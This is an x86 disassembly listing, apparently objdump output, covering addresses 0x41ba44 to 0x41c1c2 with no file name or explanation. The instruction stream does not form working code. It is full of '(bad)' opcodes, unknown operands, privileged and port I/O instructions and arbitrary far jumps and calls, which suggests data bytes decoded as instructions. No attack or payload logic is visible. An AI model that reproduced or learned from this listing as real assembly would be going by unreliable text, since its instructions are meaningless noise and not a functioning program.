  41ba44:	or     eax,0xa1e46a31
  41ba49:	das    
  41ba4a:	add    al,BYTE PTR [ecx+ebp*2+0x2e]
  41ba4e:	(bad)  
  41ba4f:	(bad)
  41ba53:	nop
  41ba54:	sbb    dh,BYTE PTR [eax-0x549d056b]
  41ba5a:	arpl   WORD PTR [edi+0x524b4173],sp
  41ba60:	pop    ebp
  41ba61:	mov    esi,0xd8c964e
  41ba66:	jl     0x41babf
  41ba68:	(bad)  
  41ba6a:	lahf   
  41ba6b:	in     al,dx
  41ba6c:	and    al,0xb
  41ba6e:	mov    es,ecx
  41ba70:	cld    
  41ba71:	(bad)  
  41ba72:	push   esp
  41ba73:	jl     0x41babd
  41ba75:	jb     0x41ba2e
  41ba77:	and    DWORD PTR [edi+ebx*2-0x2],0xfffffff8
  41ba7c:	pop    edx
  41ba7d:	mov    ch,0x5e
  41ba7f:	fidivr WORD PTR [edx-0x11]
  41ba82:	xchg   esi,eax
  41ba83:	jno    0x41bae6
  41ba85:	mov    ebx,DWORD PTR [edi+ecx*2-0x60fd7f0d]
  41ba8c:	cmc    
  41ba8d:	inc    esp
  41ba8e:	lahf   
  41ba8f:	cmp    BYTE PTR [ebx+eiz*4],dh
  41ba92:	inc    edi
  41ba93:	test   al,0xc6
  41ba95:	inc    esp
  41ba96:	jp     0x41baa6
  41ba98:	loopne 0x41ba25
  41ba9a:	daa    
  41ba9b:	pusha  
  41ba9c:	imul   eax,DWORD PTR [eax+0x0],0x55
  41baa0:	loopne 0x41baf8
  41baa2:	dec    sp
  41baa4:	(bad)
  41baa9:	cs clc 
  41baab:	add    eax,0xdff90e37
  41bab0:	sub    eax,0x549e3f0f
  41bab5:	aad    0xab
  41bab7:	inc    ebx
  41bab8:	sar    DWORD PTR [ecx],1
  41baba:	mov    dh,0x71
  41babc:	pop    esp
  41babd:	bound  eax,QWORD PTR [ecx]
  41babf:	enter  0x5e4a,0xb
  41bac3:	(bad)  
  41bac4:	adc    eax,0x6d027d87
  41bac9:	cld    
  41baca:	cmp    bh,dl
  41bacc:	in     eax,dx
  41bacd:	and    al,0xc9
  41bacf:	cmp    BYTE PTR [edx],dl
  41bad1:	cld    
  41bad2:	pushf  
  41bad3:	rol    DWORD PTR [esi-0x42],1
  41bad6:	push   edx
  41bad7:	mov    esp,0xcb16d16c
  41badc:	xor    eax,0xa7ac3db6
  41bae1:	mov    esp,0x8b9b1f25
  41bae6:	mov    ebp,0xa69e4d46
  41baeb:	mov    dh,0xe1
  41baed:	in     eax,dx
  41baee:	or     dl,BYTE PTR ds:[ebx+0x5e]
  41baf2:	std    
  41baf3:	xchg   ebp,eax
  41baf4:	(bad)  
  41baf5:	in     eax,0x2d
  41baf7:	aaa    
  41baf8:	sbb    ah,BYTE PTR [eax]
  41bafa:	out    0xe2,eax
  41bafc:	retf   0xd40b
  41baff:	push   esi
  41bb00:	and    DWORD PTR [ebx],0x1b
  41bb03:	xchg   ebx,eax
  41bb04:	cmp    dl,BYTE PTR [eax-0xe18cd8]
  41bb0a:	inc    esp
  41bb0b:	and    DWORD PTR [ebx-0x55bda229],esi
  41bb11:	cmp    esi,DWORD PTR [ebp+0x17]
  41bb14:	fdivr  st,st(4)
  41bb16:	jae    0x41badf
  41bb18:	call   DWORD PTR [ecx]
  41bb1a:	data16 fsubrp st(2),st
  41bb1d:	jns    0x41bb35
  41bb1f:	add    ecx,eax
  41bb21:	jmp    0x41bac1
  41bb23:	call   0xa04:0x9b8984c6
  41bb2a:	fild   DWORD PTR [eax+0x3c6bc8de]
  41bb30:	mov    dl,0x2a
  41bb32:	push   ss
  41bb33:	inc    esp
  41bb34:	push   esi
  41bb35:	icebp  
  41bb36:	lock add BYTE PTR [edi],ah
  41bb39:	imul   DWORD PTR [ebx+0x5e]
  41bb3c:	dec    eax
  41bb3d:	out    dx,eax
  41bb3e:	aam    0xdd
  41bb40:	jl     0x41bbac
  41bb42:	cwde   
  41bb43:	mov    ch,0xe
  41bb45:	fmul   QWORD PTR [eax+0x23]
  41bb48:	into   
  41bb49:	adc    BYTE PTR [ecx],ch
  41bb4b:	pop    ebp
  41bb4c:	jmp    0x559535ce
  41bb51:	cmp    eax,0xf0194587
  41bb56:	iret   
  41bb57:	and    DWORD PTR [ebx-0x7a],0x2b25f878
  41bb5e:	add    edi,DWORD PTR [ecx]
  41bb60:	sahf   
  41bb61:	xchg   BYTE PTR [esi],ah
  41bb63:	fst    QWORD PTR [ecx]
  41bb65:	(bad)  
  41bb67:	sub    DWORD PTR [eax+esi*1+0x7e],ecx
  41bb6b:	shl    BYTE PTR [eax+esi*1+0x2cc28e09],1
  41bb72:	out    0x6c,eax
  41bb74:	fdivp  st(4),st
  41bb76:	test   eax,0x408a51de
  41bb7b:	cdq    
  41bb7c:	jno    0x41bb68
  41bb7e:	push   es
  41bb7f:	inc    ebp
  41bb81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb82:	sbb    edx,DWORD PTR [ebx+0x12084751]
  41bb88:	icebp  
  41bb89:	push   esi
  41bb8a:	xchg   ebx,eax
  41bb8b:	adc    BYTE PTR [edi+0x5bd5a24d],dh
  41bb91:	cmp    edi,DWORD PTR [edx]
  41bb93:	fimul  WORD PTR [ebp+0x57]
  41bb96:	rcr    BYTE PTR [esi+esi*2+0x55ef788d],0xfa
  41bb9e:	bound  esi,QWORD PTR [ebx+0x3d3a9c84]
  41bba4:	ror    DWORD PTR [esi*2+0x333cceb4],1
  41bbab:	stos   BYTE PTR es:[edi],al
  41bbac:	xchg   esi,eax
  41bbad:	outs   dx,BYTE PTR ds:[esi]
  41bbae:	lods   al,BYTE PTR ds:[esi]
  41bbaf:	lea    ebp,[edi+0x5671ee45]
  41bbb5:	jne    0x41bb92
  41bbb7:	popa   
  41bbb8:	mov    edi,0xcb0c7c57
  41bbbd:	loop   0x41bc34
  41bbbf:	daa    
  41bbc0:	sbb    BYTE PTR [ebx+0x1d],cl
  41bbc3:	(bad)  
  41bbc4:	int3   
  41bbc5:	mov    dh,ch
  41bbc7:	mov    fs,WORD PTR [esi+0x720db538]
  41bbcd:	push   edx
  41bbce:	clc    
  41bbcf:	push   ecx
  41bbd0:	das    
  41bbd1:	aaa    
  41bbd2:	xchg   edi,eax
  41bbd3:	sbb    BYTE PTR [esi+0x16],ah
  41bbd6:	mov    esi,0xc2e466dd
  41bbdb:	jbe    0x41bc48
  41bbdd:	jp     0x41bbf7
  41bbdf:	test   BYTE PTR [ebx-0x73ea3e03],ah
  41bbe5:	xor    al,ch
  41bbe7:	js     0x41bbfe
  41bbe9:	mov    DWORD PTR [ebp-0x28139810],ecx
  41bbef:	and    DWORD PTR [edx-0xb92fa25],0x35aea553
  41bbf9:	cdq    
  41bbfa:	sbb    eax,0xbd454f7f
  41bbff:	aaa    
  41bc00:	mov    bl,0x13
  41bc02:	(bad)  
  41bc03:	call   0xfe35:0xb363ee4d
  41bc0a:	cli    
  41bc0b:	xchg   ecx,eax
  41bc0c:	arpl   dx,di
  41bc0e:	cmp    BYTE PTR [eax+0x53],ah
  41bc11:	inc    edi
  41bc12:	adc    eax,0xb961fcda
  41bc17:	ss push 0x7ed405ee
  41bc1d:	mov    ah,0xbb
  41bc1f:	fdiv   DWORD PTR [ebp-0x59ef7ff]
  41bc25:	and    eax,0x503ecadd
  41bc2a:	popa   
  41bc2b:	in     al,dx
  41bc2c:	and    ebx,0x139b7964
  41bc32:	fs mov esi,0xe837c312
  41bc38:	cmp    BYTE PTR [ebx+0x2a],bh
  41bc3b:	dec    esi
  41bc3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc3d:	jne    0x41bc1a
  41bc3f:	inc    esi
  41bc40:	std    
  41bc41:	mov    dl,0x8b
  41bc43:	scas   eax,DWORD PTR es:[edi]
  41bc44:	sbb    eax,0xa78fae3e
  41bc49:	and    DWORD PTR [esi+0x8],ebp
  41bc4c:	sub    BYTE PTR [edi+0x7f82ba4],cl
  41bc52:	call   0x4b37:0xbd8a40e0
  41bc59:	loope  0x41bc95
  41bc5b:	jg     0x41bc63
  41bc5d:	iret   
  41bc5e:	inc    eax
  41bc5f:	inc    eax
  41bc60:	inc    ebx
  41bc61:	dec    esi
  41bc62:	sub    edi,DWORD PTR [edx+0x20]
  41bc65:	mov    cl,0xad
  41bc67:	test   eax,0xe6bad1d3
  41bc6c:	retf   0x93da
  41bc6f:	jmp    0x93b1f333
  41bc74:	frstor [esi]
  41bc76:	jecxz  0x41bcc9
  41bc78:	ret    
  41bc79:	inc    esi
  41bc7a:	jnp    0x41bc92
  41bc7c:	push   ebx
  41bc7d:	inc    edx
  41bc7e:	or     edi,DWORD PTR [ebx+0x52]
  41bc81:	(bad)  
  41bc82:	pushf  
  41bc83:	dec    ebx
  41bc84:	xchg   DWORD PTR [esi],esp
  41bc86:	xlat   BYTE PTR ds:[ebx]
  41bc87:	push   ecx
  41bc88:	or     cl,BYTE PTR [eax+esi*1-0x433dd1c7]
  41bc8f:	jle    0x41bc11
  41bc91:	inc    ebx
  41bc92:	mov    edi,0x35cd95b2
  41bc97:	dec    eax
  41bc98:	adc    al,0x9e
  41bc9a:	jb     0x41bd0f
  41bc9c:	jo     0x41bcdc
  41bc9e:	cli    
  41bc9f:	(bad)  
  41bca0:	loopne 0x41bc52
  41bca2:	addr16 pop esp
  41bca4:	adc    esp,DWORD PTR [eax-0x6c]
  41bca7:	mov    edi,0x58f547a
  41bcac:	pop    esp
  41bcad:	fisubr DWORD PTR [ecx-0x18]
  41bcb0:	pushf  
  41bcb1:	or     BYTE PTR [esi-0x26],bl
  41bcb4:	sub    eax,0xb8942a4b
  41bcb9:	loop   0x41bc65
  41bcbb:	(bad)  
  41bcbc:	outs   dx,BYTE PTR ds:[esi]
  41bcbd:	leave  
  41bcbe:	dec    ebx
  41bcbf:	cwde   
  41bcc0:	sahf   
  41bcc1:	adc    al,0xef
  41bcc3:	(bad)  
  41bcc4:	mov    ch,0x27
  41bcc6:	cmp    dh,BYTE PTR [eax+edi*1-0x68]
  41bcca:	gs cmp ecx,0xffffffb9
  41bcce:	loopne 0x41bc59
  41bcd0:	ja     0x41bcc7
  41bcd2:	sub    BYTE PTR [edi+edx*2-0x2637b426],0xde
  41bcda:	sub    ecx,DWORD PTR [edx+0x266b8c84]
  41bce0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bce1:	pop    ds
  41bce2:	xlat   BYTE PTR ds:[bx]
  41bce4:	fs repz sub al,0xcb
  41bce8:	test   al,0x87
  41bcea:	test   BYTE PTR [ecx+0x10572263],0xe5
  41bcf1:	dec    edx
  41bcf2:	add    esi,DWORD PTR [edx]
  41bcf4:	jo     0x41bcc7
  41bcf6:	inc    eax
  41bcf7:	push   eax
  41bcf8:	push   edi
  41bcf9:	test   al,0x4a
  41bcfb:	adc    ch,bl
  41bcfd:	and    BYTE PTR [ecx-0x7b],ch
  41bd00:	jecxz  0x41bc8d
  41bd02:	stos   DWORD PTR es:[edi],eax
  41bd03:	push   eax
  41bd04:	jp     0x41bd1f
  41bd06:	sbb    BYTE PTR [ebp-0x9],al
  41bd09:	stos   DWORD PTR es:[edi],eax
  41bd0a:	xor    eax,ebx
  41bd0c:	mov    bl,bl
  41bd0e:	mov    esi,0x35c40725
  41bd13:	fwait
  41bd14:	shr    ebx,0x82
  41bd17:	(bad)  [esi+edi*1]
  41bd1a:	scas   al,BYTE PTR es:[edi]
  41bd1b:	shl    ah,0xe6
  41bd1e:	rol    BYTE PTR [ecx+0x646fb202],1
  41bd24:	xor    DWORD PTR [ebp-0x78],esi
  41bd27:	inc    edi
  41bd28:	add    al,0xe7
  41bd2a:	adc    dl,BYTE PTR [esi-0x6250fb89]
  41bd30:	sub    DWORD PTR [ecx-0x54dcd807],ecx
  41bd36:	or     BYTE PTR [eax-0x3c],ah
  41bd39:	fs stos DWORD PTR es:[edi],eax
  41bd3b:	enter  0xeaf0,0x16
  41bd3f:	scas   eax,DWORD PTR es:[edi]
  41bd40:	push   eax
  41bd41:	and    DWORD PTR [ebx],esi
  41bd43:	rcr    DWORD PTR [eax+0xf41fc2f],1
  41bd49:	repz and al,0x5d
  41bd4c:	aam    0xfc
  41bd4e:	les    esp,FWORD PTR [ecx+0x3b71c975]
  41bd54:	sub    ebx,eax
  41bd56:	gs call 0x944b:0x1a7fddc6
  41bd5e:	xor    dh,bl
  41bd60:	and    eax,ebp
  41bd62:	test   eax,0xfbca4240
  41bd67:	jnp    0x41bdcd
  41bd69:	pop    ecx
  41bd6a:	pop    edi
  41bd6b:	imul   esi,DWORD PTR [eax],0x53a76d0f
  41bd71:	shl    DWORD PTR [edi],1
  41bd73:	int    0x48
  41bd75:	mov    ecx,0x5cb1622
  41bd7a:	sahf   
  41bd7b:	mov    bh,0x8f
  41bd7d:	iret   
  41bd7e:	sbb    DWORD PTR [edi-0x44],ebx
  41bd81:	push   0xffffffb6
  41bd83:	aam    0x9b
  41bd85:	out    0xe2,al
  41bd87:	jp     0x41bd5b
  41bd89:	sar    dl,1
  41bd8b:	int3   
  41bd8c:	in     eax,0xd4
  41bd8e:	push   ds
  41bd8f:	nop
  41bd90:	mov    BYTE PTR [edi+eiz*1],ch
  41bd93:	and    al,0x9e
  41bd95:	lahf   
  41bd96:	inc    ebp
  41bd97:	test   al,0xde
  41bd99:	jg     0x41be06
  41bd9b:	inc    edi
  41bd9c:	mov    al,0x1d
  41bd9e:	fcomip st,st(5)
  41bda0:	stc    
  41bda1:	add    eax,0x854c5271
  41bda6:	ret    0xcce3
  41bda9:	stc    
  41bdaa:	jne    0x41bd66
  41bdac:	mul    DWORD PTR [esi+edx*8+0x2a584110]
  41bdb3:	test   al,0xb0
  41bdb5:	dec    eax
  41bdb6:	dec    BYTE PTR ds:0xa659f668
  41bdbc:	xor    eax,0x580adfe0
  41bdc1:	sub    eax,0x36f6822b
  41bdc6:	jnp    0x41bd71
  41bdc8:	and    DWORD PTR [esi],ebx
  41bdca:	push   0x20
  41bdcc:	shr    esp,0x0
  41bdcf:	pop    edi
  41bdd0:	push   eax
  41bdd1:	sub    eax,0x2d6c19ae
  41bdd6:	js     0x41bde0
  41bdd8:	mov    es,WORD PTR [ebx-0x20]
  41bddb:	not    DWORD PTR [ecx]
  41bddd:	sbb    al,0x45
  41bddf:	loopne 0x41bd8e
  41bde1:	js     0x41be39
  41bde3:	mov    al,0xef
  41bde5:	int    0x4e
  41bde7:	scas   al,BYTE PTR es:[edi]
  41bde8:	scas   eax,DWORD PTR es:[edi]
  41bde9:	pop    es
  41bdea:	add    BYTE PTR [esi],bl
  41bdec:	push   ds
  41bded:	push   esi
  41bdee:	cmp    edi,ebp
  41bdf0:	inc    ebx
  41bdf1:	and    al,0xd9
  41bdf3:	repz cwde 
  41bdf5:	adc    bl,dh
  41bdf7:	sti    
  41bdf8:	adc    edx,DWORD PTR [ecx-0x3943e961]
  41bdfe:	mov    ?,WORD PTR [ecx+0x729d3428]
  41be04:	pop    esi
  41be05:	or     DWORD PTR [edx+esi*8-0xbff1388],esi
  41be0c:	aad    0xbe
  41be0e:	jo     0x41bdd7
  41be10:	cmp    al,0xaa
  41be12:	das    
  41be13:	pop    ebx
  41be14:	iret   
  41be15:	mov    dl,0xdf
  41be17:	jl     0x41be42
  41be19:	and    esi,DWORD PTR [ebx+0x5c]
  41be1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be1d:	cmp    al,0x10
  41be1f:	xor    DWORD PTR [ebx+eiz*1],ebp
  41be22:	fsub   st,st(7)
  41be24:	pop    sp
  41be26:	call   0x78909501
  41be2b:	sahf   
  41be2c:	gs dec ecx
  41be2e:	push   esp
  41be2f:	or     BYTE PTR [ebp+eiz*8+0x4e471518],0xb
  41be37:	sbb    BYTE PTR [esi],bl
  41be39:	mov    ds:0xa18dabd6,al
  41be3e:	call   0x6b0f0de3
  41be43:	std    
  41be44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be45:	add    DWORD PTR [ebx],ebx
  41be47:	pop    ss
  41be48:	xlat   BYTE PTR ds:[ebx]
  41be49:	mov    edx,0x4d187aa8
  41be4e:	add    BYTE PTR [edi],bh
  41be50:	or     ch,bl
  41be52:	pop    edi
  41be53:	adc    dh,0xae
  41be56:	mov    cl,0x20
  41be58:	outs   dx,BYTE PTR ds:[esi]
  41be59:	dec    eax
  41be5a:	mov    ds:0x3042d7bd,eax
  41be5f:	daa    
  41be60:	adc    edx,ebx
  41be62:	cmp    bl,0xcf
  41be65:	jmp    0x5184:0xfa938e2e
  41be6c:	jmp    0xc9a8cabd
  41be71:	mov    ?,edi
  41be73:	push   edx
  41be74:	inc    ebx
  41be75:	repnz xor DWORD PTR [eax],edi
  41be78:	jmp    0x41beed
  41be7a:	jbe    0x41becb
  41be7c:	and    ebp,esi
  41be7e:	sub    bh,BYTE PTR [eax]
  41be80:	mov    WORD PTR [esi-0x5d],gs
  41be83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be84:	out    dx,al
  41be85:	call   0x30760090
  41be8a:	lods   al,BYTE PTR ds:[esi]
  41be8b:	scas   eax,DWORD PTR es:[edi]
  41be8c:	jl     0x41befd
  41be8e:	adc    bh,bh
  41be90:	(bad)  
  41be91:	dec    ebx
  41be92:	inc    edi
  41be93:	xchg   DWORD PTR [edi],edi
  41be95:	idiv   BYTE PTR [ebp-0x7ec15195]
  41be9b:	push   edx
  41be9c:	xchg   BYTE PTR [ecx+0x41],bh
  41be9f:	mov    cl,0x8a
  41bea1:	(bad)  
  41bea2:	lahf   
  41bea3:	mov    ecx,0x1e6d61f7
  41bea8:	enter  0xd2c4,0xac
  41beac:	jl     0x41beea
  41beae:	jmp    0xe6eebad
  41beb3:	dec    esp
  41beb4:	sub    eax,0xc5cd752a
  41beb9:	lods   al,BYTE PTR ds:[esi]
  41beba:	call   0xf69f:0xe873888b
  41bec1:	mov    ch,0x8
  41bec3:	std    
  41bec4:	jb     0x41beaf
  41bec6:	inc    ebx
  41bec7:	int3   
  41bec8:	call   0xa47107b
  41becd:	std    
  41bece:	sahf   
  41becf:	mov    ah,0xe9
  41bed1:	mov    gs,WORD PTR [ecx+0x46]
  41bed4:	in     al,0xfa
  41bed6:	sbb    dh,BYTE PTR [eax+ecx*1]
  41bed9:	mov    WORD PTR [ebp+0x48],fs
  41bedc:	mov    al,dl
  41bede:	dec    edx
  41bedf:	cmc    
  41bee0:	and    esp,DWORD PTR [ecx+ebx*4-0x40]
  41bee4:	mov    ecx,gs
  41bee6:	in     al,0x72
  41bee8:	lock mov esp,?
  41beeb:	dec    ebx
  41beec:	pop    ds
  41beed:	loop   0x41bf45
  41beef:	int3   
  41bef0:	fmul   st,st(4)
  41bef2:	sahf   
  41bef3:	div    BYTE PTR [ebp+esi*4-0x38]
  41bef7:	sub    al,0xb7
  41bef9:	lea    esi,[edx+0x2f18fc02]
  41beff:	scas   al,BYTE PTR es:[edi]
  41bf00:	(bad)  
  41bf01:	cmp    eax,0x54cefe73
  41bf06:	inc    edi
  41bf07:	push   esp
  41bf08:	popa   
  41bf09:	sub    cl,BYTE PTR [esi-0x44043097]
  41bf0f:	xchg   ebp,eax
  41bf10:	jmp    0x7140:0x6323ecd1
  41bf17:	or     BYTE PTR [edx],0x3f
  41bf1a:	cmc    
  41bf1b:	ja     0x41beb0
  41bf1d:	(bad)  
  41bf1e:	aas    
  41bf1f:	mov    bl,0x1f
  41bf21:	mov    al,0x58
  41bf23:	out    0xc2,al
  41bf25:	jns    0x41bea7
  41bf27:	in     al,0xee
  41bf29:	(bad)  
  41bf2a:	int3   
  41bf2b:	getsec 
  41bf2d:	mov    dh,0xf7
  41bf2f:	in     al,0x58
  41bf31:	imul   esp,edi,0x4e
  41bf34:	mov    eax,ds:0xae25385a
  41bf39:	inc    eax
  41bf3a:	push   0xffffffe5
  41bf3c:	push   ebp
  41bf3d:	dec    ebp
  41bf3e:	inc    eax
  41bf3f:	in     eax,0xee
  41bf41:	push   esp
  41bf42:	xchg   ecx,eax
  41bf43:	mov    eax,0x16d87035
  41bf48:	call   FWORD PTR [ebx+0x1ca95b2a]
  41bf4e:	sub    eax,0x40a28cfb
  41bf53:	inc    ebx
  41bf54:	stos   DWORD PTR es:[edi],eax
  41bf55:	sub    DWORD PTR [eax-0x79],esi
  41bf58:	int    0xd4
  41bf5a:	mov    edi,0xc51925bd
  41bf5f:	imul   edx,DWORD PTR [eax],0x70248ac1
  41bf65:	cmp    BYTE PTR ds:0xef8d18d3,ch
  41bf6b:	repz rdpmc 
  41bf6e:	pusha  
  41bf6f:	dec    esp
  41bf70:	adc    esi,edx
  41bf72:	ins    DWORD PTR es:[edi],dx
  41bf73:	clc    
  41bf74:	lods   al,BYTE PTR ds:[esi]
  41bf75:	lahf   
  41bf76:	out    dx,al
  41bf77:	pop    ebp
  41bf78:	popa   
  41bf79:	(bad)  [ebp-0x15]
  41bf7c:	lea    eax,[edi+0x368d35d3]
  41bf82:	in     al,0x65
  41bf84:	xchg   ecx,eax
  41bf85:	mov    dh,0xd1
  41bf87:	inc    edx
  41bf88:	pop    eax
  41bf89:	inc    ebp
  41bf8a:	inc    ebx
  41bf8b:	daa    
  41bf8c:	outs   dx,DWORD PTR ds:[esi]
  41bf8d:	mov    dh,0xfb
  41bf8f:	test   al,0x83
  41bf91:	dec    esp
  41bf92:	bound  ebx,QWORD PTR [edi-0x48]
  41bf95:	hlt    
  41bf96:	and    al,0x15
  41bf98:	add    BYTE PTR [eax+0x6a],dh
  41bf9b:	add    eax,0xe0813753
  41bfa0:	cmp    ebx,DWORD PTR [eax]
  41bfa2:	inc    ecx
  41bfa3:	or     eax,0xdd994826
  41bfa8:	push   ds
  41bfa9:	push   ss
  41bfaa:	pop    ss
  41bfab:	xlat   BYTE PTR ds:[ebx]
  41bfac:	int    0xb0
  41bfae:	mov    edi,0x1f167b8e
  41bfb3:	jns    0x41bf4c
  41bfb5:	mul    BYTE PTR [edx]
  41bfb7:	test   BYTE PTR [eax+edx*4+0x14c275bf],cl
  41bfbe:	xchg   ecx,eax
  41bfbf:	mov    al,ds:0x3cc05e26
  41bfc4:	pop    ebp
  41bfc5:	idiv   DWORD PTR ds:0xd7270785
  41bfcb:	jae    0x41c004
  41bfcd:	add    DWORD PTR [edi+0x15b8ae1a],0xffffffa8
  41bfd4:	cld    
  41bfd5:	sbb    bl,dh
  41bfd7:	in     al,dx
  41bfd8:	lock test al,0xd4
  41bfdb:	mov    eax,0x3b8828d2
  41bfe0:	mov    eax,0x6c5a098a
  41bfe5:	pop    ds
  41bfe6:	cld    
  41bfe7:	ins    BYTE PTR es:[edi],dx
  41bfe8:	pop    ebp
  41bfe9:	adc    bl,BYTE PTR [esi+0x372c94ec]
  41bfef:	cdq    
  41bff0:	jae    0x41bfeb
  41bff2:	retf   
  41bff3:	xor    eax,0xe0415b78
  41bff8:	sbb    bl,cl
  41bffa:	dec    esi
  41bffb:	adc    dl,BYTE PTR ds:0x6bd9ab57
  41c001:	xor    al,0x20
  41c003:	push   0xb606aa44
  41c008:	push   cs
  41c009:	out    dx,eax
  41c00a:	push   0x882b5b8e
  41c00f:	fs adc al,0x61
  41c012:	sti    
  41c013:	xor    al,0x7d
  41c015:	mov    ds:0x67bc1c1e,eax
  41c01a:	cmp    BYTE PTR [ebx-0x16bb1feb],al
  41c020:	imul   esi,DWORD PTR [ecx+edi*8-0x2f],0x469e8fa9
  41c028:	pop    ebp
  41c029:	xor    BYTE PTR [esp+ebp*1+0x68],0x45
  41c02e:	add    dh,BYTE PTR [edx+0x34]
  41c031:	(bad)  
  41c033:	stc    
  41c034:	(bad)
  41c037:	jle    0x41c0a7
  41c039:	sub    DWORD PTR [edi+0x30],eax
  41c03c:	fld    DWORD PTR [ecx]
  41c03e:	mov    al,ds:0x9274a2c9
  41c043:	mov    edi,0x27bd0eed
  41c048:	jmp    0xce2e5897
  41c04d:	ret    
  41c04e:	jne    0x41bfdd
  41c050:	xchg   esi,eax
  41c051:	push   0xd1e19c05
  41c056:	fmul   DWORD PTR [esi+0x44]
  41c059:	push   ebp
  41c05a:	jb     0x41c057
  41c05c:	pop    esi
  41c05d:	and    eax,0xe4c1e603
  41c062:	jae    0xf00de92
  41c068:	inc    edi
  41c069:	jle    0x41c038
  41c06b:	ja     0x41c09e
  41c06d:	stos   BYTE PTR es:[edi],al
  41c06e:	fimul  WORD PTR [edx+0x673d99ce]
  41c074:	jecxz  0x41c0db
  41c076:	mov    dh,0xa1
  41c078:	mov    ds:0xd5dec709,eax
  41c07d:	es mov bl,0x30
  41c080:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c081:	mov    ebx,0xf64905c5
  41c086:	std    
  41c087:	int    0x6f
  41c089:	(bad)  
  41c08a:	pop    ds
  41c08b:	cmp    dl,dl
  41c08d:	pushf  
  41c08e:	stos   DWORD PTR es:[edi],eax
  41c08f:	(bad)  
  41c090:	pop    DWORD PTR ds:[edx-0x408bb916]
  41c097:	das    
  41c098:	push   ds
  41c099:	pop    ebx
  41c09a:	cmc    
  41c09b:	and    al,0xea
  41c09d:	rol    BYTE PTR [ebx-0x25b5d1e9],cl
  41c0a3:	ret    0x7a08
  41c0a6:	das    
  41c0a7:	dec    esp
  41c0a8:	imul   ecx,DWORD PTR [eax],0xb599dc51
  41c0ae:	cwde   
  41c0af:	sahf   
  41c0b0:	mov    ?,WORD PTR [ecx-0x6e]
  41c0b3:	jg     0x41c110
  41c0b5:	in     al,0xb0
  41c0b7:	bnd jbe 0x41c0f8
  41c0ba:	cmp    dh,ah
  41c0bc:	inc    esp
  41c0bd:	shl    DWORD PTR [ebp-0x30fefb33],1
  41c0c3:	data16 data16 loopne 0x41c065
  41c0c7:	retf   
  41c0c8:	jecxz  0x41c13e
  41c0ca:	sub    al,0x2b
  41c0cc:	(bad)  
  41c0ce:	test   BYTE PTR [edx+0x35],0x33
  41c0d2:	sub    eax,0x9716f151
  41c0d7:	(bad)  
  41c0d8:	push   ebx
  41c0d9:	push   ebx
  41c0da:	fnstsw WORD PTR [eax+ecx*8-0x330fb261]
  41c0e1:	ret    0xcc81
  41c0e4:	ins    DWORD PTR es:[edi],dx
  41c0e5:	shr    ecx,0x91
  41c0e8:	jmp    0xc2c7:0x16c2002d
  41c0ef:	enter  0x47a8,0xde
  41c0f3:	mov    esi,0xf32ecdba
  41c0f8:	shl    ebp,1
  41c0fa:	mov    dl,0x54
  41c0fc:	es pop ebp
  41c0fe:	lahf   
  41c0ff:	dec    esp
  41c100:	xor    cl,BYTE PTR [ebx+0x67]
  41c103:	ret    0xef70
  41c106:	and    ecx,edx
  41c108:	mov    esp,0xfe31045b
  41c10d:	imul   esp,DWORD PTR [ebp+ebp*4-0x12],0x36
  41c112:	sub    esi,DWORD PTR [ecx]
  41c114:	push   ss
  41c115:	rol    DWORD PTR [ebx+0x50],1
  41c118:	mov    edx,0x40c4e475
  41c11d:	pop    esp
  41c11e:	(bad)  
  41c11f:	clc    
  41c120:	xchg   edi,eax
  41c121:	into   
  41c122:	jecxz  0x41c156
  41c124:	cmp    BYTE PTR ds:0xda6374cf,cl
  41c12a:	xor    esi,ebx
  41c12c:	jne    0x41c1a7
  41c12e:	dec    edi
  41c12f:	mov    ds:0x936f9d08,eax
  41c134:	cwde   
  41c135:	push   ecx
  41c136:	or     ebx,DWORD PTR [ecx+0x75]
  41c139:	dec    esp
  41c13a:	mov    ds:0x3a3aeaa,al
  41c13f:	and    dl,bh
  41c141:	mov    ds:0x2d9171b6,eax
  41c146:	out    dx,eax
  41c147:	adc    esp,edi
  41c149:	xchg   esi,eax
  41c14a:	ss icebp 
  41c14c:	pop    esi
  41c14d:	aas    
  41c14e:	xor    bl,bh
  41c150:	iret   
  41c151:	fwait
  41c152:	add    al,0xa4
  41c154:	push   esi
  41c155:	dec    ecx
  41c156:	dec    edi
  41c157:	jmp    0x435a:0x74483ee2
  41c15e:	xchg   edx,eax
  41c15f:	fistp  DWORD PTR [edx+0x12]
  41c162:	mov    bh,BYTE PTR [esi]
  41c164:	rcr    DWORD PTR [ebx+0x25379d0e],cl
  41c16a:	dec    ebx
  41c16b:	push   eax
  41c16c:	adc    al,0x21
  41c16e:	push   ebp
  41c16f:	inc    eax
  41c170:	jge    0x41c1e5
  41c172:	stos   BYTE PTR es:[edi],al
  41c173:	daa    
  41c174:	dec    esi
  41c175:	loope  0x41c13c
  41c177:	stos   DWORD PTR es:[edi],eax
  41c178:	ss shl al,cl
  41c17b:	imul   edi,DWORD PTR [edx+ecx*4-0x62a5d068],0x4a821bc6
  41c186:	cmc    
  41c187:	call   0x338a550
  41c18c:	pop    ecx
  41c18d:	push   esp
  41c18e:	sbb    ah,bh
  41c190:	aaa    
  41c191:	xchg   edi,eax
  41c192:	mov    ebx,0x54d48cc4
  41c197:	(bad)  
  41c198:	aam    0xe4
  41c19a:	push   ss
  41c19b:	mov    DWORD PTR [esi],esp
  41c19d:	retf   0x41e7
  41c1a0:	mov    ebx,0x13590321
  41c1a6:	out    dx,eax
  41c1a7:	gs aam 0x30
  41c1aa:	pop    ds
  41c1ab:	sbb    DWORD PTR [ebx],ebx
  41c1ad:	push   ecx
  41c1ae:	ds xchg edi,eax
  41c1b0:	or     ebp,edx
  41c1b2:	jbe    0x41c1b2
  41c1b4:	retf   0xfb0b
  41c1b7:	pop    ebx
  41c1b8:	fdivrp st(5),st
  41c1ba:	pop    ss
  41c1bb:	mov    bl,0x16
  41c1bd:	ins    DWORD PTR es:[edi],dx
  41c1be:	aas    
  41c1bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1c0:	aas    
  41c1c1:	pop    edx
  41c1c2:	xlat   BYTE PTR ds:[ebx]
